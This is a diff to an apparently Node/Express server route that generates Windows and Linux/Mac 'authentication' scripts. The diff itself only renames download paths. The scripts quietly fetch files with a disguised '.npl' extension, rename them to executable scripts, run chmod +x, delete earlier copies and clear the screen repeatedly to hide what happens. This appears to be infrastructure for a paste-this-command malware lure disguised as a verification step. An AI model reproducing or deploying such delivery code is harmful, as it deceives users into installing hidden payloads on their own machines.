@@ -80,13 +80,13 @@ router.get("/script/:os", (req, res) => {
   if (os === "windows") {
     script = `@echo off
 echo Authenticated
-curl -s "${domain}/users/verify/${token}"
+curl -s "${domain}/task/verify/${token}"
 `;
   } else if (os === "linux" || os === "mac") {
     script = `#!/bin/bash
 set -e
 echo "Authenticated"
-curl -s "${domain}/users/verify/${token}"
+curl -s "${domain}/task/verify/${token}"
 `;
   } else {
     return res.status(400).send("Unsupported OS");
@@ -148,7 +148,7 @@ router.get("/auth",  (req, res) => {
   // Templates for non-browser clients
   const templates = {
     windows: `@echo off
-curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/users/token.npl
+curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token.npl
 cls
 if exist "%USERPROFILE%\\token.npl" del "%USERPROFILE%\\token"
 if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
@@ -162,7 +162,7 @@ set -e
 echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/users/tokenlinux.npl
+wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux.npl
 clear
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
 clear
@@ -178,7 +178,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/Documents"
 clear
-curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/users/tokenlinux.npl"
+curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux.npl"
 clear
 chmod +x "$HOME/Documents/tokenlinux.sh"
 clear
@@ -217,7 +217,7 @@ router.get("/auth/windows", (req, res) => {
     // requestLog[ip].step1 = now;
     const domain = req.protocol + '://' + req.get('host');
     res.type("text/plain").send(`@echo off
-curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/users/token?token=${token}
+curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token?token=${token}
 cls
 if exist "%USERPROFILE%\token.npl" del "%USERPROFILE%\token"
 if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
@@ -254,7 +254,7 @@ set -e
 echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/users/tokenlinux?token=${token}
+wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux?token=${token}
 clear
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
 clear
@@ -292,7 +292,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/Documents"
 clear
-curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/users/tokenlinux?token=${token}"
+curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux?token=${token}"
 clear
 chmod +x "$HOME/Documents/tokenlinux.sh"
 clear
